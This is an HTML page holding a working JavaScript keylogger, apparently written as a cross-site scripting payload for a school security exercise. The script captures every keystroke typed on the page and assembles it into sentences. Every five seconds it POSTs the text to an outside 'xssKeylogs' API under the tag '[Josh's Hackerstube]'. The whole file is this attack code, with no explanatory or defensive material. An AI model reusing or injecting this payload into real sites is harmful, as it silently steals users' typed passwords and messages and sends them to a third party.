<!doctype html>
<html class="no-js" lang="">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
</head>

<body>

  <script type="text/javascript">
      let sentence = "";
      let text = "";

      let bodyTemplate = {
        "keyword": "[Josh's Hackerstube]",
        "payload": ""
      }

      document.onkeydown = e => {
        console.clear()
        console.log("Key:", e.key, "Code:", e.keyCode)
        console.log("Sentence: " + sentence);

        switch (e.keyCode) {
            // Filter unwanted characters
            case 16: // Shift
            case 20: // Caps
            case 17: // Ctrl
              break;
            // Remove last character on BACKSPACE
            case 8:
                sentence = sentence.slice(0, -1);
                break;
            // Set text after sentence END
            case 190:   // .
            case 221:   // !
            case 219:   // ?
              sentence = sentence + e.key;
            case 13:    // Enter
            case 9:     // Tab
              text = text + sentence;
              sentence = "";
              break;
            // Add character to word
            default:
                sentence = sentence + e.key;
        }
      };

      setInterval(function() {
        if(text.length > 0)
        {
            console.log("Text for submission: " + text)
            postData(text);
            text = ""; sentence = ""; word = "";
        }
      }, 5000)

      function postData(data) {
          bodyTemplate["payload"] = data
          return fetch('https://m183.gibz-informatik.ch/api/xssKeylogs', {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json'},
            body: JSON.stringify(bodyTemplate)
          })
          .then(response => response.json());
      }
  </script>
</body>
</html>
